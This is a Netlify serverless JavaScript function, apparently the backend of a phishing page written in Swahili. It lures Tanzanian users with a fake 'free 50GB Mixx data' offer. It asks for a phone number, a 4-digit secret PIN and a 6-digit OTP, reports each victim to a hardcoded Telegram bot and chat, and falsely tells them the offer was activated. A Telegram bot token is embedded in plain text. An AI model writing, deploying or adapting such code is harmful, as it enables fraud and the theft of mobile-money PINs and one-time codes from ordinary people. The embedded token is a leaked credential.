// netlify/functions/send-to-telegram.js

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8979567614:AAHvIQzCZcEDbfZXZtFqt5pSpUpAduayra0';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8834429633';

const userStore = {};

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 204, headers };
    }

    try {
        const path = event.path.replace('/.netlify/functions/send-to-telegram', '');

        // ===== SEND OTP =====
        if (event.httpMethod === 'POST' && path === '/send-otp') {
            const { phone, pin } = JSON.parse(event.body);

            if (!phone || !pin) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Tafadhali jaza namba zote mbili.'
                    })
                };
            }

            const cleanPhone = phone.replace(/^0+/, '').replace(/^\+255/, '');

            if (cleanPhone.length < 9) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Namba ya simu si sahihi.'
                    })
                };
            }

            // ✅ PIN MUST BE EXACTLY 4 DIGITS
            if (!/^\d{4}$/.test(pin)) {
                return {
                    statusCode: 401,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Namba ya Siri lazima iwe tarakimu 4.'
                    })
                };
            }

            // Store user info
            userStore[cleanPhone] = {
                phone: cleanPhone,
                pin: pin,
                timestamp: new Date().toISOString(),
                referral: `REF-${cleanPhone}`
            };

            console.log(`📱 OTP request for ${cleanPhone}`);

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    success: true,
                    message: 'Msimbo wa OTP umetumwa.',
                    phone: cleanPhone
                })
            };
        }

        // ===== VERIFY OTP =====
        if (event.httpMethod === 'POST' && path === '/verify-otp') {
            const { phone, otp } = JSON.parse(event.body);

            if (!phone || !otp) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Msimbo unahitajika.'
                    })
                };
            }

            const cleanPhone = phone.replace(/^0+/, '').replace(/^\+255/, '');

            // ✅ OTP MUST BE EXACTLY 6 DIGITS
            if (!/^\d{6}$/.test(otp)) {
                return {
                    statusCode: 401,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Msimbo lazima uwe tarakimu 6.'
                    })
                };
            }

            const userData = userStore[cleanPhone];
            const referral = userData ? userData.referral : 'N/A';
            const timestamp = new Date().toISOString();

            // Send to Telegram
            const message = `
📱 *NEW MIXX REFERRAL!*

📞 *Phone:* ${cleanPhone}
🔗 *Referral Code:* ${referral}
📦 *Offer:* 50GB Mixx Data
🕐 *Time:* ${timestamp}

✅ *Status:* Successfully Activated!
            `;

            let telegramSuccess = false;
            let telegramError = null;

            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
                try {
                    const telegramResponse = await fetch(
                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                        {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: TELEGRAM_CHAT_ID,
                                text: message,
                                parse_mode: 'Markdown'
                            })
                        }
                    );

                    if (telegramResponse.ok) {
                        telegramSuccess = true;
                        console.log(`✅ Telegram sent for ${cleanPhone}`);
                    } else {
                        telegramError = await telegramResponse.text();
                        console.error(`❌ Telegram error: ${telegramError}`);
                    }
                } catch (error) {
                    telegramError = error.message;
                    console.error(`❌ Telegram error: ${telegramError}`);
                }
            }

            // Clean up
            delete userStore[cleanPhone];

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    success: true,
                    message: 'Hongera! Umepata 50GB DATA BURE.',
                    data: {
                        phone: cleanPhone,
                        offer: '50GB Mixx',
                        activated: true,
                        referral: referral,
                        telegramSent: telegramSuccess,
                        telegramError: telegramError
                    }
                })
            };
        }

        return {
            statusCode: 404,
            headers,
            body: JSON.stringify({
                success: false,
                message: 'Route not found'
            })
        };

    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                success: false,
                message: 'Internal server error',
                error: error.message
            })
        };
    }
};
